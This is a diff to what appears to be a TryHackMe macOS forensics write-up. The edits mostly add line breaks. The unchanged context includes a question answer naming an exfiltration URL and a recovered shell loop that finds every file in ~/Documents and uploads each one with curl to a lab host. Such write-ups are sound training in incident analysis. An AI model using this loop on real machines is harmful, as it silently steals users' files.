@@ -214,6 +214,8 @@ root@tryhackme:/home/ubuntu/mac/root/Library/Application Support/com.apple.TCC# 
 root@tryhackme:/home/ubuntu/mac/root/Library/Application Support/com.apple.TCC# 
 ```
 
+<br>
+
 > 1.9. <em>What was the URL to which the application was exfiltrating data?</em><br><a id='1.9'></a>
 >> <strong><code>http://techthm.thm/exfils</code></strong><br>
 <p></p>
@@ -227,8 +229,10 @@ find ~/Documents -type f | while read file; do
     curl -s -X POST http://techthm.thm/exfil -F "file=@$file"
 done
 exit 0
-
 ```
+
+<br>
+<br>
 
 
 
